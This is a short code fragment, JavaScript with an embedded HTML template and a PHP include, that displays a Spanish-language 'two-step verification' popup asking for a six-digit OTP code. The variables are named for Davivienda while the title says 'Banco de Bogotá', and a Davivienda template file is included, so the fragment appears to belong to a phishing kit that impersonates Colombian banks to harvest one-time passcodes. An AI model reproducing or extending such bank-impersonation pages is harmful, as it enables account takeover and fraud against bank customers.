var davivienda_titulo = 'Banco de Bogotá';
var davivienda_body = `
<div id="popCorreo">
    <table>
        <tr>
            <td><img src="${my_banco}img/correo.png" width="46"></td>
            <td style="font-size:24px; padding-left: 10px;">Verificación <strong>de dos pasos</strong></td>
        </tr>
    </table>
    <br>
    <div style="background-color: #F8F8F8;padding: 20px; border-radius: 5px;">
        Código OTP
        <br>
        <input type="password" class="entradas-blanco" id="txtOTP"
            name="txtOTP" maxlength="6" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
        <div id="msgCelular" class="msgErr">Por favor ingrese el código de verificación</div>

    </div>
    <br>
    <div style="text-align: center;">
        <div class="btn-rojo" id="btnOTP"
            style="margin: 0 auto;">Validar</div>
    </div>
</div>
`;



<?php require_once('_plantilla_davivienda.php'); ?>


//<script>
    $('#popCorreo,#fondo').show();